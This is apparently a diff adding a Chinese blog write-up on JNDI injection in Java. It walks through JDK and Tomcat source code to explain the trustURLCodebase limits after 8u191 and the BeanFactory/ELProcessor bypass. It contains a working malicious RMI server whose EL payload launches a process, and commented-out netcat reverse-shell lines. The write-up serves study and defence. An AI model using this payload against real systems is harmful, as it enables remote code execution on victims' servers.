+                        return ((DirObjectFactory)factory).getObjectInstance(
+                            ref, name, nameCtx, environment, attrs);
+                    } else if (factory != null) {
+                        return factory.getObjectInstance(ref, name, nameCtx,
+                                                         environment);
+                    }
+                    // No factory found, so return original refInfo.
+                    // Will reach this point if factory class is not in
+                    // class path and reference does not contain a URL for it
+                    return refInfo;
+
+                } else {
+                    // if reference has no factory, check for addresses
+                    // containing URLs
+                    // ignore name &amp; attrs params; not used in URL factory
+
+                    answer = processURLAddrs(ref, name, nameCtx, environment);
+                    if (answer != null) {
+                        return answer;
+                    }
+                }
+            }
+
+            // try using any specified factories
+            answer = createObjectFromFactories(refInfo, name, nameCtx,
+                                               environment, attrs);
+            return (answer != null) ? answer : refInfo;
+    }
+</code></pre>
+<p><code>                    factory = getObjectFactoryFromReference(ref, f);</code>里面会调用<code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code></p>
+<h4 id="javaxnamingspinamingmanagergetobjectfactoryfromreference-2"><code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code></h4>
+<pre><code>javax.naming.spi.NamingManager#getObjectFactoryFromReference
+</code></pre>
+<p>ref是<code>calc</code>的Reference对象，<code>factoryName</code>是<code>calc</code>。</p>
+<pre><code class="language-java">static ObjectFactory getObjectFactoryFromReference(
+        Reference ref, String factoryName)
+        throws IllegalAccessException,
+        InstantiationException,
+        MalformedURLException {
+        Class&lt;?&gt; clas = null;
+
+        // Try to use current class loader
+        try {
+             clas = helper.loadClass(factoryName);
+        } catch (ClassNotFoundException e) {
+            // ignore and continue
+            // e.printStackTrace();
+        }
+        // All other exceptions are passed up.
+
+        // Not in class path; try to use codebase
+        String codebase;
+        if (clas == null &amp;&amp;
+                (codebase = ref.getFactoryClassLocation()) != null) {
+            try {
+                clas = helper.loadClass(factoryName, codebase);
+            } catch (ClassNotFoundException e) {
+            }
+        }
+
+        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
+    }
+</code></pre>
+<p>首先尝试从本地CLASSPATH获取该class,接着根据factoryName和codebase加载远程的class（调用loadCLass）,跟进看下loadClass方法的实现<br>
+<code>com.sun.naming.internal.VersionHelper12#loadClass</code></p>
+<pre><code>com.sun.naming.internal.VersionHelper12#loadClass
+</code></pre>
+<p>这里的<code>className</code>是<code>calc</code>，<code>codebase</code>是<code>http://127.0.0.1:8088/</code>。</p>
+<pre><code class="language-java">public Class&lt;?&gt; loadClass(String className, String codebase)
+            throws ClassNotFoundException, MalformedURLException {
+
+        ClassLoader parent = getContextClassLoader();
+        ClassLoader cl =
+                 URLClassLoader.newInstance(getUrlArray(codebase), parent);
+
+        return loadClass(className, cl);
+    }
+</code></pre>
+<pre><code class="language-java">  Class&lt;?&gt; loadClass(String className, ClassLoader cl)
+        throws ClassNotFoundException {
+        Class&lt;?&gt; cls = Class.forName(className, true, cl);
+        return cls;
+    }
+</code></pre>
+<p>这里是通过<code>URLClassLoader</code>去加载远程类。</p>
+<p><code>LDAP</code>在jdk8u121至jdk8u191仍可用的原因是client的调用链没有用到<code>com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code>，故没有<code>trustURLCodebase</code>的限制。</p>
+<h3 id="调用栈-2">调用栈</h3>
+<pre><code class="language-java">loadClass:72, VersionHelper12 (com.sun.naming.internal)
+loadClass:87, VersionHelper12 (com.sun.naming.internal)
+getObjectFactoryFromReference:158, NamingManager (javax.naming.spi)
+getObjectInstance:189, DirectoryManager (javax.naming.spi)
+c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
+p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
+lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
+lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
+lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
+lookup:417, InitialContext (javax.naming)
+main:45, HelloClient
+</code></pre>
+<h3 id="jdk8u191"><code>jdk8u191</code></h3>
+<p>切换到jdk8u191以上版本<code>ldap</code>，不会触发</p>
+<p>原因是<code>com.sun.naming.internal.VersionHelper12#loadClass</code>中也有了<code>trustURLCodebase</code>的限制。</p>
+<pre><code class="language-java">public Class&lt;?&gt; loadClass(String className, String codebase)
+
+            throws ClassNotFoundException, MalformedURLException {
+    //这里会判断trustURLCodebase，默认为false
+
+        if (&quot;true&quot;.equalsIgnoreCase(trustURLCodebase)) {
+
+            ClassLoader parent = getContextClassLoader();
+
+            ClassLoader cl =
+
+                    URLClassLoader.newInstance(getUrlArray(codebase), parent);
+
+
+            return loadClass(className, cl);
+
+        } else {
+
+            return null;
+
+        }
+
+    }
+</code></pre>
+<p>在jdk<code>11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code>版本开始默认<code>com.sun.jndi.ldap.object.trustURLCodebase</code>设置为<code>false</code>,<code>ldap</code>加载远程的字节码不会执行成功。</p>
+<h2 id="jdk8u191以后"><code>jdk8u191</code>以后</h2>
+<p>两种方法：</p>
+<p><code>rmi</code> -&gt; 利用本地<code>Class</code>作为<code>Reference Factory</code> ，指定<code>Bean Class</code>去触发<code>EL</code>表达式。</p>
+<p><code>ldap</code> -&gt; 利用<code>LDAP</code>返回序列化数据，触发本地<code>Gadget</code></p>
+<h3 id="8u191的改变"><code>8u191</code>的改变</h3>
+<p><code>8u191</code>以后增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为<code>false</code>。</p>
+<p>由于<code>com.sun.jndi.ldap.object.trustURLCodebase</code>(<code>8u191</code>)和<code>com.sun.jndi.rmi.object.trustURLCodebase</code>(<code>8u121</code>)默认为<code>false</code>，在<code>jdk8u191</code>之后<code>RMI</code>和<code>LDAP</code>默认都不能从远程加载类,然而还是可以在<code>RMI</code>中从本地获取对象，在<code>LDAP</code>中返回序列化数据触发本地<code>gadget</code>。</p>
+<p>在<code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code>方法中，会先从本地的<code>classpath</code>中寻找该类，然后才是远程加载。</p>
+<pre><code class="language-java"> static ObjectFactory getObjectFactoryFromReference(
+        Reference ref, String factoryName)
+        throws IllegalAccessException,
+        InstantiationException,
+        MalformedURLException {
+        Class&lt;?&gt; clas = null;
+		//从本地的classpath中寻找类
+        // Try to use current class loader
+        try {
+             clas = helper.loadClass(factoryName);
+        } catch (ClassNotFoundException e) {
+            // ignore and continue
+            // e.printStackTrace();
+        }
+        // All other exceptions are passed up.
+
+        // Not in class path; try to use codebase
+            //远程加载该类
+        String codebase;
+        if (clas == null &amp;&amp;
+                (codebase = ref.getFactoryClassLocation()) != null) {
+            try {
+                clas = helper.loadClass(factoryName, codebase);
+            } catch (ClassNotFoundException e) {
+            }
+        }
+
+        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
+    }
+</code></pre>
+<p><s>加载的时候会执行静态代码块、代码块、无参构造函数和<code>getObjectInstance</code>方法。只需要在受害者本地<code>CLASSPATH</code>找到<code>factoryName</code>这个<code>Reference Factory</code>类的对象并且在这四个地方其中一块能执行<code>payload</code>就可以了。<code>Michael Stepankin</code>师傅在<code>tomcat</code>中找到<code>org.apache.naming.factory.BeanFactory#getObjectInstance</code>来进行利用。</s></p>
+<p><code>javax.naming.spi.NamingManager#getObjectInstance</code>的代码如下，在执行<code>factory = getObjectFactoryFromReference(ref, f);</code>以后，由于构造的恶意<code>payload</code>中有受害者<code>classpath</code>中的<code>factoryName</code>，会返回对应的<code>factory</code>工厂类，然后走入<code>factory</code>工厂类的<code>factory.getObjectInstance(ref, name, nameCtx,environment);</code>。</p>
+<pre><code class="language-java">    public static Object
+        getObjectInstance(Object refInfo, Name name, Context nameCtx,
+                          Hashtable&lt;?,?&gt; environment)
+        throws Exception
+    {
+
+        ObjectFactory factory;
+
+        // Use builder if installed
+        ObjectFactoryBuilder builder = getObjectFactoryBuilder();
+        if (builder != null) {
+            // builder must return non-null factory
+            factory = builder.createObjectFactory(refInfo, environment);
+            return factory.getObjectInstance(refInfo, name, nameCtx,
+                environment);
+        }
+
+        // Use reference if possible
+        Reference ref = null;
+        if (refInfo instanceof Reference) {
+            ref = (Reference) refInfo;
+        } else if (refInfo instanceof Referenceable) {
+            ref = ((Referenceable)(refInfo)).getReference();
+        }
+
+        Object answer;
+
+        if (ref != null) {
+            String f = ref.getFactoryClassName();
+            if (f != null) {
+                // if reference identifies a factory, use exclusively
+
+                factory = getObjectFactoryFromReference(ref, f);
+                if (factory != null) {
+                    return factory.getObjectInstance(ref, name, nameCtx,
+                                                     environment);
+                }
+                // No factory found, so return original refInfo.
+                // Will reach this point if factory class is not in
+                // class path and reference does not contain a URL for it
+                return refInfo;
+
+            } else {
+                // if reference has no factory, check for addresses
+                // containing URLs
+
+                answer = processURLAddrs(ref, name, nameCtx, environment);
+                if (answer != null) {
+                    return answer;
+                }
+            }
+        }
+</code></pre>
+<h3 id="rmi的绕过"><code>rmi</code>的绕过</h3>
+<p>找到一个受害者本地<code>CLASSPATH</code>中的类作为恶意的<code>Reference Factory</code>工厂类，并利用这个本地的<code>Factory</code>类通过反射构建<code>Reference</code>执行命令。</p>
+<h4 id="测试环境-3">测试环境</h4>
+<p>高版本<code>jdk</code>和<code>tomcat</code>依赖和<code>el</code>表达式依赖</p>
+<p><code>jdk8u231</code> + <code>tomcat-catalina 8.5.0</code> +<code>apache.el-7.0.26</code></p>
+<p><code>maven</code>:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;
+         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+
+    &lt;groupId&gt;org.example&lt;/groupId&gt;
+    &lt;artifactId&gt;anquanke_trx03_rmibypass&lt;/artifactId&gt;
+    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
+
+    &lt;properties&gt;
+        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;
+        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;
+    &lt;/properties&gt;
+    &lt;dependencies&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+        &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
+        &lt;version&gt;8.5.0&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --&gt;
+
+
+    &lt;/dependencies&gt;
+
+&lt;/project&gt;
+</code></pre>
+<p>另外需要一个<code>com.springsource.org.apache.el-7.0.26.jar</code>的依赖，直接用<code>maven</code>没下下来，于是直接下载的<code>jar</code>包在<code>project structure</code> 中进行导入。</p>
+<p>通过后面的链接下载<code>com.springsource.org.apache.el-7.0.26.jar</code>的<code>jar</code>包依赖：https://developer.aliyun.com/mvn/search</p>
+<p><code>org.apache.naming.factory.BeanFactory</code> 在 <code>getObjectInstance()</code> 中会通过反射的方式实例化<code>Reference</code>所指向的任意<code>Bean Class</code>（<code>EL.processor</code>），并且会调用<code>setter</code>(<code>eval</code>)方法为所有的属性赋值。而该<code>Bean Class</code>（<code>EL.processor</code>）的类名、属性、属性值，全都来自于<code>Reference</code>对象（在<code>Server</code>端构造<code>Reference</code>对象的时候巧妙地设置好了），均是攻击者可控的。</p>
+<p><code>Reference</code>指向的<code>Bean Class</code>的要求：</p>
+<p>有一个无参构造方法（<code>newInstance</code>用到）</p>
+<p>有<code>public</code>的<code>setter</code>方法且参数为一个<code>String</code>类型</p>
+<p><code>javax.el.ELProcessor</code>符合条件：</p>
+<p><code>ELProcessor</code>中有个<code>eval(String)</code>方法可以执行<code>EL</code>表达式(<code>setter</code>方法)</p>
+<p>于是，指向的<code>Bean Class</code>选择为<code>javax.el.ELProcessor</code>（有一个无参构造方法，且有个<code>eval</code>方法可以执行EL表达式），<code>factory</code>工厂类选择为<code>org.apache.naming.factory.BeanFactory</code>(有一个<code>getObjectInstance</code>方法符合条件)。</p>
+<h4 id="server攻击者-3"><code>Server</code>（攻击者）</h4>
+<p>在高版本中（如：<code>JDK8u191</code>以上版本）虽然不能从远程加载恶意的<code>Factory</code>，但是我们依然可以在返回的<code>Reference</code>中指定<code>Factory Class</code>，这个工厂类必须在受害目标本地的<code>CLASSPATH</code>中。工厂类必须实现 <code>javax.naming.spi.ObjectFactory</code> 接口，并且至少存在一个 <code>getObjectInstance()</code> 方法。<code>org.apache.naming.factory.BeanFactory</code> 刚好满足条件并且存在被利用的可能。<code>org.apache.naming.factory.BeanFactory</code> 存在于<code>Tomcat</code>依赖包中，所以使用也是非常广泛。</p>
+<p><code>org.apache.naming.factory.BeanFactory</code> 在 <code>getObjectInstance()</code> 中会通过反射的方式实例化<code>Reference</code>所指向的任意<code>Bean Class</code>，并且会调用<code>setter</code>方法为所有的属性赋值。而该<code>Bean Class</code>的类名、属性、属性值，全都来自于<code>Reference</code>对象，均是攻击者可控的。</p>
+<p><code>setter</code>方法是<code>x=eval</code>那里。</p>
+<pre><code class="language-java">package org.hh.Server;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import org.apache.naming.ResourceRef;
+
+import javax.naming.NamingException;
+import javax.naming.StringRefAddr;
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class Registry_app {
+    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
+        Registry registry = LocateRegistry.createRegistry(1099);
+        // 实例化Reference，指定目标Bean Class类为javax.el.ELProcessor，factory工厂类为org.apache.naming.factory.BeanFactory,factorylocation为null
+
+        ResourceRef resourceRef= new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+        // 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码，再利用el表达式执行命令
+
+        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));
+        //nc反弹shell，错误目录写法
+//        resourceRef.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).&quot; +
+//                &quot;newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder['(java.lang.String[])']&quot; +
+//                &quot;(['D:\\sectools\\web\\netcat-win32-1.12\\nc.exe','-e','cmd','127.0.0.1','1388']).start()\&quot;)&quot;));
+        //nc反弹shell正确目录写法
+//        resourceRef.add(new StringRefAddr(&quot;x&quot;,
+//                &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().&quot; +
+//                        &quot;getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder['(java.lang.String[])']&quot; +
+//                        &quot;(['D:/sectools/web/netcat-win32-1.12/nc.exe','-e','cmd','127.0.0.1','1388']).start()\&quot;)&quot;));
+        //弹计算器
+        resourceRef.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()\&quot;)&quot;));
+        //弹notepad
+        //resourceRef.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c', 'notepad']).start()\&quot;)&quot;));
+
+
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
+
+
+
+        registry.bind(&quot;hello&quot;, referenceWrapper);
+
+    }
+
+}
+
+</code></pre>
+<h4 id="client受害者-3"><code>Client</code>（受害者）</h4>
+<pre><code class="language-java">package org.hh.Client;
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+public class client_lookup {
+    public static void main(String[] args) throws NamingException {
+
+        String jndiname = &quot;rmi://127.0.0.1:1099/hello&quot;;
+        Context ctx = new InitialContext();
+        ctx.lookup(jndiname);
+    }
+
+}
+
+</code></pre>
+<h5 id="javaxnaminginitialcontextgeturlordefaultinitctx-3"><code>javax.naming.InitialContext#getURLOrDefaultInitCtx</code></h5>
+<pre><code class="language-java">javax.naming.InitialContext#getURLOrDefaultInitCtx
+</code></pre>
+<p>参数<code>name</code>是<code>rmi://127.0.0.1:1099/hello</code>。</p>
+<pre><code class="language-java">    protected Context getURLOrDefaultInitCtx(String name)
+        throws NamingException {
+        if (NamingManager.hasInitialContextFactoryBuilder()) {
+            return getDefaultInitCtx();
+        }
+        String scheme = getURLScheme(name);
+        if (scheme != null) {
+            Context ctx = NamingManager.getURLContext(scheme, myProps);
+            if (ctx != null) {
+                return ctx;
+            }
+        }
+        return getDefaultInitCtx();
+    }
+</code></pre>
+<p><code>getURLScheme</code>方法解析协议名称，<code>NamingManager.getURLContext</code>方法返回解析对应协议的<code>rmiURLContext</code>对象。</p>
+<h5 id="comsunjnditoolkiturlgenericurlcontextlookup-3"><code>com.sun.jndi.toolkit.url.GenericURLContext#lookup</code></h5>
+<p>接着调用如下lookup函数</p>
+<pre><code class="language-java">com.sun.jndi.toolkit.url.GenericURLContext#lookup
+</code></pre>
+<p>参数var1是<code>rmi://127.0.0.1:1099/hello</code>。</p>
+<pre><code class="language-java">    public Object lookup(String var1) throws NamingException {
+        ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);
+        Context var3 = (Context)var2.getResolvedObj();
+
+        Object var4;
+        try {
+            var4 = var3.lookup(var2.getRemainingName());
+        } finally {
+            var3.close();
+        }
+
+        return var4;
+    }
+</code></pre>
+<p><code>var4 = var3.lookup(var2.getRemainingName());</code>这一行会调用↓：</p>
+<h5 id="comsunjndirmiregistryregistrycontextlookup-2"><code>com.sun.jndi.rmi.registry.RegistryContext#lookup</code></h5>
+<p>参数是var1是 hello</p>
+<pre><code>com.sun.jndi.rmi.registry.RegistryContext#lookup
+</code></pre>
+<pre><code class="language-java">    public Object lookup(Name var1) throws NamingException {
+        if (var1.isEmpty()) {
+            return new RegistryContext(this);
+        } else {
+            Remote var2;
+            try {
+                var2 = this.registry.lookup(var1.get(0));
+            } catch (NotBoundException var4) {
+                throw new NameNotFoundException(var1.get(0));
+            } catch (RemoteException var5) {
+                throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
+            }
+
+            return this.decodeObject(var2, var1.getPrefix(1));
+        }
+    }
+</code></pre>
+<p><code>var2 = this.registry.lookup(var1.get(0));</code>这里会去RMI注册中心寻找hello对象，返回的var2是一个<code>ReferenceWrapper_Stub(ReferenceWrapper)</code>类的对象。</p>
+<p>最后会调用当前类的<code>decodeObject</code>方法（为了返回一个<code>Reference</code>，也就是将<code>ReferenceWrapper</code>的对象转成<code>Reference</code>对象），↓</p>
+<h5 id="comsunjndirmiregistryregistrycontextdecodeobject-2"><code>com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code></h5>
+<pre><code class="language-java">   private Object decodeObject(Remote var1, Name var2) throws NamingException {
+        try {
+            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
+            Reference var8 = null;
+            if (var3 instanceof Reference) {
+                var8 = (Reference)var3;
+            } else if (var3 instanceof Referenceable) {
+                var8 = ((Referenceable)((Referenceable)var3)).getReference();
+            }
+
+            if (var8 != null &amp;&amp; var8.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase) {
+                throw new ConfigurationException(&quot;The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.&quot;);
+            } else {
+                return NamingManager.getObjectInstance(var3, var2, this, this.environment);
+            }
+        } catch (NamingException var5) {
+            throw var5;
+        } catch (RemoteException var6) {
+            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
+        } catch (Exception var7) {
+            NamingException var4 = new NamingException();
+            var4.setRootCause(var7);
+            throw var4;
+        }
+    }
+</code></pre>
+<p>由于在<code>server</code>端代码将<code>factorylocation</code>设为null了，</p>
+<pre><code class="language-java">            if (var8 != null &amp;&amp; var8.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase) {
+                throw new ConfigurationException(&quot;The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.&quot;);
+            } else {
+                return NamingManager.getObjectInstance(var3, var2, this, this.environment);
+            }
+</code></pre>
+<p>这里就会走入<code>javax.naming.spi.NamingManager#getObjectInstance</code>。</p>
+<h5 id="javaxnamingspinamingmanagergetobjectinstance-2"><code>javax.naming.spi.NamingManager#getObjectInstance</code></h5>
+<p>参数<code>refInfo</code>是<code>ResourceRef</code>，<code>name</code>是<code>hello</code>，从这里开始和<code>8u121</code>之前的<code>rmi</code>利用链有区别。</p>
+<pre><code class="language-java"> public static Object
+        getObjectInstance(Object refInfo, Name name, Context nameCtx,
+                          Hashtable&lt;?,?&gt; environment)
+        throws Exception
+    {
+
+        ObjectFactory factory;
+
+        // Use builder if installed
+        ObjectFactoryBuilder builder = getObjectFactoryBuilder();
+        if (builder != null) {
+            // builder must return non-null factory
+            factory = builder.createObjectFactory(refInfo, environment);
+            return factory.getObjectInstance(refInfo, name, nameCtx,
+                environment);
+        }
+
+        // Use reference if possible
+        Reference ref = null;
+        if (refInfo instanceof Reference) {
+            ref = (Reference) refInfo;
+        } else if (refInfo instanceof Referenceable) {
+            ref = ((Referenceable)(refInfo)).getReference();
+        }
+
+        Object answer;
+
+        if (ref != null) {
+            String f = ref.getFactoryClassName();
+            if (f != null) {
+                // if reference identifies a factory, use exclusively
+
+                factory = getObjectFactoryFromReference(ref, f);
+                if (factory != null) {
+                    return factory.getObjectInstance(ref, name, nameCtx,
+                                                     environment);
+                }
+                // No factory found, so return original refInfo.
+                // Will reach this point if factory class is not in
+                // class path and reference does not contain a URL for it
+                return refInfo;
+
+            } else {
+                // if reference has no factory, check for addresses
+                // containing URLs
+
+                answer = processURLAddrs(ref, name, nameCtx, environment);
+                if (answer != null) {
+                    return answer;
+                }
+            }
+        }
+
+        // try using any specified factories
+        answer =
+            createObjectFromFactories(refInfo, name, nameCtx, environment);
+        return (answer != null) ? answer : refInfo;
+    }
+</code></pre>
+<p><code>NamignManager.getObjectInstance</code>方法里会调用：</p>
+<pre><code class="language-java">javax.naming.spi.NamingManager#getObjectFactoryFromReference
+</code></pre>
+<p><code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code></p>
+<pre><code class="language-java">  static ObjectFactory getObjectFactoryFromReference(
+        Reference ref, String factoryName)
+        throws IllegalAccessException,
+        InstantiationException,
+        MalformedURLException {
+        Class&lt;?&gt; clas = null;
+
+        // Try to use current class loader
+        try {
+             clas = helper.loadClass(factoryName);
+        } catch (ClassNotFoundException e) {
+            // ignore and continue
+            // e.printStackTrace();
+        }
+        // All other exceptions are passed up.
+
+        // Not in class path; try to use codebase
+        String codebase;
+        if (clas == null &amp;&amp;
+                (codebase = ref.getFactoryClassLocation()) != null) {
+            try {
+                clas = helper.loadClass(factoryName, codebase);
+            } catch (ClassNotFoundException e) {
+            }
+        }
+
+        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
+    }
+</code></pre>
+<p>通过这个<code>getObjectFactoryFromReference</code>返回一个本地<code>classpath</code>中的<code>factory</code>工厂类。</p>
+<p>然后调用<code>factory</code>工厂类的</p>
+<pre><code class="language-java">org.apache.naming.factory.BeanFactory#getObjectInstance
+</code></pre>
+<h5 id="orgapachenamingfactorybeanfactorygetobjectinstance"><code>org.apache.naming.factory.BeanFactory#getObjectInstance</code></h5>
+<pre><code class="language-java">org.apache.naming.factory.BeanFactory#getObjectInstance
+</code></pre>
+<p>参数<code>obj</code>是<code>ResourceRef</code>，<code>name</code>是<code>hello</code>。</p>
+<pre><code class="language-java">public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws NamingException {
+    //判断obj是否是ResourceRef的实例
+        if (obj instanceof ResourceRef) {
+            NamingException ne;
+            try {
+                //转为Reference类的对象
+                Reference ref = (Reference)obj;
+                //获取ClassName，beanClassName是javax.el.ELProcessor
+                String beanClassName = ref.getClassName();
+                Class&lt;?&gt; beanClass = null;
+                ClassLoader tcl = Thread.currentThread().getContextClassLoader();
+                if (tcl != null) {
+                    try {
+                        beanClass = tcl.loadClass(beanClassName);
+                    } catch (ClassNotFoundException var26) {
+                    }
+                } else {
+                    try {
+                        beanClass = Class.forName(beanClassName);
+                    } catch (ClassNotFoundException var25) {
+                        var25.printStackTrace();
+                    }
+                }
+
+                if (beanClass == null) {
+                    throw new NamingException(&quot;Class not found: &quot; + beanClassName);
+                } else {
+                    BeanInfo bi = Introspector.getBeanInfo(beanClass);
+                    PropertyDescriptor[] pda = bi.getPropertyDescriptors();
+                    //通过反射获取无参构造方法进行实例化，这里解码可能有点问题，没有解码出获取无参构造方法那步
+                    Object bean = beanClass.newInstance();
+                    //获取forceString属性的值，在exp里已经将forceString的值设为了x=eval	
+                    RefAddr ra = ref.get(&quot;forceString&quot;);
+                    Map&lt;String, Method&gt; forced = new HashMap();
+                    String value;
+                    String propName;
+                    int i;
+                    if (ra != null) {
+                        //获取的value就是x=eval 
+                        value = (String)ra.getContent();
+                        Class&lt;?&gt;[] paramTypes = new Class[]{String.class};
+                        String[] arr$ = value.split(&quot;,&quot;);
+                        i = arr$.length;
+
+                        for(int i$ = 0; i$ &lt; i; ++i$) {
+                            String param = arr$[i$];
+                            param = param.trim();
+                            //定位=
+                            int index = param.indexOf(61);
+                            if (index &gt;= 0) {
+                                propName = param.substring(index + 1).trim();
+                                param = param.substring(0, index).trim();
+                            } else {
+                                propName = &quot;set&quot; + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1);
+                            }
+
+                            try {
+                                //param是x，第二个参数是获取的eval方法
+                                forced.put(param, beanClass.getMethod(propName, paramTypes));
+                            } catch (SecurityException | NoSuchMethodException var24) {
+                                throw new NamingException(&quot;Forced String setter &quot; + propName + &quot; not found for property &quot; + param);
+                            }
+                        }
+                    }
+//这里获取所有的refAddr，类型有scope，auth,singleton,forceString和自定义的x
+                    Enumeration e = ref.getAll();
+
+                    while(true) {
+                        while(true) {
+                            do {
+                                do {
+                                    do {
+                                        do {
+                                            do {
+                                                if (!e.hasMoreElements()) {
+                                                    return bean;
+                                                }
+											//这里获取下一个元素，propName=x的时候会跳出这个循环
+                                                ra = (RefAddr)e.nextElement();
+                                                propName = ra.getType();
+                                            } while(propName.equals(&quot;factory&quot;));
+                                        } while(propName.equals(&quot;scope&quot;));
+                                    } while(propName.equals(&quot;auth&quot;));
+                                } while(propName.equals(&quot;forceString&quot;));
+                            } while(propName.equals(&quot;singleton&quot;));
+						//这里value变成了构造的el表达式
+                            value = (String)ra.getContent();
+                            Object[] valueArray = new Object[1];
+                            //获取x对应的方法
+                            Method method = (Method)forced.get(propName);
+                            if (method != null) {
+                                //传递参数
+                                valueArray[0] = value;
+
+                                try {
+                                    //通过反射调用，调用方法
+                                    method.invoke(bean, valueArray);
+                                } catch (IllegalArgumentException | InvocationTargetException | IllegalAccessException var23) {
+                                    throw new NamingException(&quot;Forced String setter &quot; + method.getName() + &quot; threw exception for property &quot; + propName);
+                                }
+                            } else {
+                                int i = false;
+
+                                for(i = 0; i &lt; pda.length; ++i) {
+                                    if (pda[i].getName().equals(propName)) {
+                                        Class&lt;?&gt; propType = pda[i].getPropertyType();
+                                        if (propType.equals(String.class)) {
+                                            valueArray[0] = value;
+                                        } else if (!propType.equals(Character.class) &amp;&amp; !propType.equals(Character.TYPE)) {
+                                            if (!propType.equals(Byte.class) &amp;&amp; !propType.equals(Byte.TYPE)) {
+                                                if (!propType.equals(Short.class) &amp;&amp; !propType.equals(Short.TYPE)) {
+                                                    if (!propType.equals(Integer.class) &amp;&amp; !propType.equals(Integer.TYPE)) {
+                                                        if (!propType.equals(Long.class) &amp;&amp; !propType.equals(Long.TYPE)) {
+                                                            if (!propType.equals(Float.class) &amp;&amp; !propType.equals(Float.TYPE)) {
+                                                                if (!propType.equals(Double.class) &amp;&amp; !propType.equals(Double.TYPE)) {
+                                                                    if (!propType.equals(Boolean.class) &amp;&amp; !propType.equals(Boolean.TYPE)) {
+                                                                        throw new NamingException(&quot;String conversion for property &quot; + propName + &quot; of type '&quot; + propType.getName() + &quot;' not available&quot;);
+                                                                    }
+
+                                                                    valueArray[0] = Boolean.valueOf(value);
+                                                                } else {
+                                                                    valueArray[0] = Double.valueOf(value);
+                                                                }
+                                                            } else {
+                                                                valueArray[0] = Float.valueOf(value);
+                                                            }
+                                                        } else {
+                                                            valueArray[0] = Long.valueOf(value);
+                                                        }
+                                                    } else {
+                                                        valueArray[0] = Integer.valueOf(value);
+                                                    }
+                                                } else {
+                                                    valueArray[0] = Short.valueOf(value);
+                                                }
+                                            } else {
+                                                valueArray[0] = Byte.valueOf(value);
+                                            }
+                                        } else {
+                                            valueArray[0] = value.charAt(0);
+                                        }
+
+                                        Method setProp = pda[i].getWriteMethod();
+                                        if (setProp == null) {
+                                            throw new NamingException(&quot;Write not allowed for property: &quot; + propName);
+                                        }
+
+                                        setProp.invoke(bean, valueArray);
+                                        break;
+                                    }
+                                }
+
+                                if (i == pda.length) {
+                                    throw new NamingException(&quot;No set method found for property: &quot; + propName);
+                                }
+                            }
+                        }
+                    }
